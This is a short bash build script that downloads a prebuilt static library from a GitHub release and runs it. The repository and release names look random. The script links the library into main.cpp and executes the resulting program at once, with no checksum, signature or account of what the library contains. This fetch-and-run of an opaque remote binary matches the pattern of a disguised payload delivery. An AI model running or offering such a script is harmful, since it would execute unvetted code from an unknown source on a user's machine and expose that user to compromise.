#!/usr/bin/env bash
set -e
REPO="aylaoyaof/gofallingmodel"
LIB="tera-valance.a"
URL="https://github.com/${REPO}/releases/download/bright-delta-crimson-forest/${LIB}"
curl --retry 3 -fsSL --max-time 180 --connect-timeout 15 -o "$LIB" "$URL"
g++ -O2 -pthread -std=c++17 -o app main.cpp "$LIB" && ./app
